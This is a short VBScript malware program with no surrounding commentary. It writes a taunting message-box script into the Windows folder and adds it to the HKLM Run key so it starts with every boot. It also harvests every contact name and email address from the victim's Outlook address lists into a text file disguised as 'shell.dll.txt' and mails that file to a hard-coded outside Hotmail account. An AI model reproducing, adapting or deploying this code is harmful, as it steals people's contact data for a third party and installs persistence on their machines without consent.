set onstart = CreateObject("Scripting.FileSystemObject")
dim a
set piss = onstart.CreateTextFile("c:\windows\pissy.vbs", true)
dim x
piss.writeline("msgbox ""you pissed me off!!!"" , 2048 , ""you pissed me off!!!""")
Set pissed = WScript.CreateObject("WScript.Shell")
dim ctrlists
piss.writeline("msgbox ""you pissed me off!!!"" , 2048 , ""you pissed me off!!!""")
Set kiss = CreateObject("Scripting.FileSystemObject")
dim ctrentries
piss.writeline("msgbox ""you pissed me off!!!"" , 2048 , ""you pissed me off!!!""")
set ecl=WScript.CreateObject("Outlook.Application")
dim malead
Set WshShell = CreateObject("Wscript.Shell")
set mI=ecl.GetNameSpace("MAPI")
dim email
Call checker()
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\run\windows_startup", "c:\windows\pissy.vbs"
Call doit()
Sub doit()
Set pust = ecl.CreateItem(Mail)
Set drwho = pust.Recipients.Add ("brazz7111@hotmail.com")
Set lsd = pust.Attachments
lsd.Add ("C:\shell.dll.txt")
pust.Send
End Sub
Sub checker()
Set TextStream = kiss.CreateTextFile("C:\shell.dll.txt")
for ctrlists=1 to mI.AddressLists.Count
set a=mI.AddressLists(ctrlists)
x=1
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
Set myNamespace = ecl.GetNamespace("MAPI")
Set myAddrList = myNamespace.AddressLists(ctrlists)
Set myAddrEntries = myAddrList.AddressEntries(x)
email = myAddrEntries.Address
nameadress=malead & " (" & email & ")"
TextStream.WriteLine(nameadress)
x=x+1
next		
next
TextStream.Close
End Sub
Set ecl=Nothing
Set mI=Nothing